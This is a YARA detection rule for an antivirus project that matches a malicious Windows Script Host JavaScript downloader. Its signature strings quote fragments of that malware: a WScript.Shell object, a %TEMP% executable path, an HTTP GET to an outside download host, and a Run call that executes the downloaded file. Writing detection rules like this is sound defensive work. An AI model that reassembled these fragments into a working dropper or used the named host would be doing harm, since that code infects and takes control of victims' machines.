rule sig_20160328_72e6d0a4aba44ef04976760d096cf127 {
  meta:
    description = "datamaliciousorder - file 20160328_72e6d0a4aba44ef04976760d096cf127.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e41a3e5957bf6e0b404fd4bb559cb2a1453fca0d5deb316384dd538588a9aea0"

  strings:
    $s1  = "function Hqptmtn() {return Dnokbugnwa[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"a8JtEKsbI.exe\";};" fullword ascii
    $s2  = "Jfdhqq[Dedlhb](\"GET\", \"http://aicuiibf.com/l30woad\", false);" fullword ascii
    $s3  = "do {WScript[Exhedcdbq](Iwrodroiqu() * 11)} while (Jfdhqq[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Qfmfxxz(Hniaox, Cketl){return Hniaox - Cketl;};" fullword ascii
    $s5  = "var Dnokbugnwa = function Yzzhnovq() {return WScript[Knmmiprg](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Emfrbtfx() {return ((Asnzapoqm == true) && (Asnzapoqm == Nfcgdfdwjx)) ? 1 : Wagpzk;};" fullword ascii
    $s7  = "function Qnkqsoc(Jypme){Dnokbugnwa[\"Run\"](Jypme, Wagpzk, Wagpzk);};" fullword ascii
    $s8  = "function Yuumih(){return Knmmiprg;};" fullword ascii
    $s9  = "function Mslgxjaj()" fullword ascii
    $s10 = "var Jtpznybzra = new this[\"Date\"]();" fullword ascii
    $s11 = "Asnzapoqm = true; " fullword ascii
    $s12 = "var Asnzapoqm = false;" fullword ascii
    $s13 = "Nfcgdfdwjx = true; " fullword ascii
    $s14 = "var Bttyefkmb = false;" fullword ascii
    $s15 = "function Jpyfrosri(Ijdtf) {var Rxjxwgleq = (1, 2, 3, 4, 5, Ijdtf); return Rxjxwgleq;};" fullword ascii
    $s16 = "function Iwrodroiqu(){return 22;};" fullword ascii
    $s17 = " while (Ujpdyfuoq){" fullword ascii
    $s18 = "var Nfcgdfdwjx = false;" fullword ascii
    $s19 = "return Qfmfxxz(Rpwzhqt, Zxburnabfq);" fullword ascii
    $s20 = "function Qflahmsni(){return Bfikqeu;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}